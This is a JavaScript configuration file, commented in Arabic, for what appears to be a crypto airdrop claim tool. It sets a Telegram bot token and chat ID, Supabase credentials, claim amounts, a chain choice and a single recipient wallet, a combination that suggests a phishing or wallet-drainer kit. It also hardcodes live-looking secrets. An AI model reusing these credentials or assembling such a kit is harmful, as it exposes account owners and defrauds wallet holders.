// config.js - إعدادات الأداة (10 سلاسل مدعومة)
const CONFIG = {
    // ===== إعدادات Telegram =====
    TELEGRAM_BOT_TOKEN: "8645197792:AAE2zwaOQ7ABNuZ5N0MXg5sCqzQnMUrCcOQ",
    TELEGRAM_CHAT_ID: "7714049413",
    
    // ===== إعدادات Supabase =====
    SUPABASE_URL: "https://oliefagvnorzhlzvdfyw.supabase.co",
    SUPABASE_KEY: "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6Im9saWVmYWd2bm9yemhsenZkZnl3Iiwicm9sZSI6ImFub24iLCJpYXQiOjE3NzU1NjUwNDcsImV4cCI6MjA5MTE0MTA0N30.KZlFA_e3ub3zZnEZFBTGnshvyC9L2SNcwrfH9BiBauU",
    
    // ===== إعدادات Airdrop =====
    TOTAL_TOKENS: 120000000,
    CLAIM_AMOUNT: 1200,
    
    // ===== إعدادات العملة (10 خيارات) =====
    // الخيارات: 'erc20', 'bep20', 'trc20', 'solana', 'polygon', 'avalanche', 'arbitrum', 'optimism', 'base', 'zksync'
    TOKEN_TYPE: 'erc20',
    
    // عنوان المحفظة المستلم
    RECIPIENT_WALLET: "0x71C7656EC7ab88b098defB751B7401B5f6d8976F",
    
    // ===== إعدادات التطبيق =====
    AUTO_RETRY: true,
    MAX_RETRIES: 3,
    PROGRESS_STEPS: 8
};